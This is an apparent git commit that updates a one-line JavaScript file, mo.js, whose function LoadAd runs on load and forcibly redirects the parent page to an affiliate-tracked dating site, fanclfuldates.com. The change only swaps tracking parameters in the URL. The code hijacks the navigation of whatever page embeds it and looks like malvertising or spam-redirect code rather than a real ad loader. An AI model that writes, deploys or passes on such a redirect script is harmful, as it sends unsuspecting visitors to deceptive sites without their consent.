f6c120575d3190229b05edef4d5d450971dacd01
mp3cava <166255594+mp3cava@users.noreply.github.com>
2025-06-23 09:28:23 +0700

    Update mo.js

--- mo.js
+++ mo.js
@@ -1,1 +1,1 @@
-function LoadAd() { parent.location.href="https://argbq.fanclfuldates.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=2141019&s5=Bio&click_id=Bio"; } LoadAd();
+function LoadAd() { parent.location.href="https://argbq.fanclfuldates.com/?utm_source=da57dc555e50572d&ban=fb&j1=1&s1=55454&s2=1422095&s5=Trunks&click_id=Trunks"; } LoadAd();
